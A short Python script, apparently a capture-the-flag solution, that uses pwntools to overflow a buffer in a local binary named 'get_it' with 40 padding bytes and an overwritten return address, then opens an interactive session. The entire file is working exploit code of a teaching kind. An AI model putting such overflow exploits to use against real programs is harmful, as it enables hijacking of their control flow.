from pwn import process,packing


def exploit():
    buffer = b'A' * 40 + packing.p64(0x4005b6)
    prs = process("./get_it")
    prs.sendline(buffer)
    prs.interactive()

if __name__ == '__main__':
    exploit()
